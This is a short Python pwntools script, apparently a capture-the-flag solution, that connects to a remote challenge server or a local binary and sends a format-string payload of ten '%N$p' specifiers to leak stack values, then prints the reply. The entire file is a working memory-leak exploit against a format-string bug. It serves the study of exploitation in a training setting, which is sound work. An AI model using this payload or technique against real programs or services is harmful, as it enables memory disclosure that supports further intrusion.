from pwn import *
from pwnlib import *


if __name__ == '__main__':
    if args.args['REMOTE']:
        p = connect('csie.ctf.tw', 10128)
    else:
        p = process('./format-0ae6186d26bf949aa4e21244c08124e51b7becca')

    payload = ''
    for i in range(10):
        payload += '%' + str(5+i) + '$p'
    p.recvuntil(' = ')
    p.send(payload)

    print p.recvline()
